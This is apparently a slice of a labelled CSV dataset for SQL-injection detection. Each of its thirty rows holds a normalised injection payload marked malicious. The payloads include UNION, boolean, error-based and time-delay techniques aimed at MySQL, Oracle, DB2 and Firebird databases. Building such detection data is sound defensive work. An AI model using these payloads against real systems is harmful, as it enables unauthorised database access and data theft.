row_index,payload_norm,label,sqli_type_hint
1680,1 ) as vbli where 5139 = 5139 and 2782 = 2625--,1,
1681,"1' ) as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
1682,"1', ( select ( case when ( 3576 = 7744 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,
1683,"-2394' ) union all select 1650,1650,1650,1650,1650,1650,1650--",1,
1684,"1"" ) ) as xxdm where 4818 = 4818",1,
1685,select ( case when ( 3365 = 6236 ) then 3365 else 1/ ( select 0 ) end ) --,1,
1686,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""wsmz"" like ""wsmz",1,
1687,"1"" ) ) as ltco where 3862 = 3862 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
1688,"1' ) union all select null,null,null,null,null,null#",1,
1689,select ( case when ( 3076 = 3596 ) then 3076 else 3076* ( select 3076 from mysql.db ) end ) #,1,
1690,1' ) as ncou where 9166 = 9166 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,
1691,"-8025"" ) or ( 1436 = 4186 ) *4186 and ( ""sqwv"" like ""sqwv",1,
1692,"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
1693,1' where 9602 = 9602,1,
1694,1'+ ( select iutk where 6158 = 6158,1,
1695,"-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ajcl"" like ""ajcl",1,
1696,"-1055"" or ( 8459 = 8459 ) *4906 and ""kdbr"" = ""kdbr",1,
1697,"1 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
1698,"1%"" ) ) union all select null,null,null,null--",1,
1699,"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
1700,"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1,
1701,1 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
1702,"1' ) as rqzz where 4987 = 4987 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
1703,"-9532 ) ) union all select 6039,6039,6039,6039--",1,
1704,1'+ ( select ophz where 9158 = 9158 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',1,
1705,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""tjbe"" like ""tjbe",1,
1706,"-7248' ) where 4626 = 4626 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
1707,"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""adwg"" like ""adwg",1,
1708,"-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--",1,
1709,"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",1,
